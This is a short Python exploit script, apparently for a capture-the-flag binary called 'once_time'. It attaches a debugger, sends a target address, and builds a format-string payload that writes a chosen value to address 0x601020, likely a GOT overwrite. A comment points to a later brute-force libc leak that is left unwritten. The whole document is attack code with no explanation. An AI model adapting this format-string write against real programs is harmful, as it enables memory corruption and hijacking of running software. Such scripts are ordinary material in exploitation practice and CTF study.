#!/usr/bin/env python
from mypwn import *
context.log_level='debug'
context.arch='amd64'
p=process('./once_time')


def debugf(load=''):
    gdb.attach(p,load)

debugf('nb 4009E4\nnb 400968')
p.recvuntil('input your name: ')
p.sendline(p64(0x601020))


p.recvuntil('leave a msg: ')
payload=fmt_payload(0xc,{0x601020:0x0983},write_size='short',just_ret_print_payload=1)
print(payload)
print(len(payload))
p.send(payload+p64(0))

# baopo leak libc






p.interactive()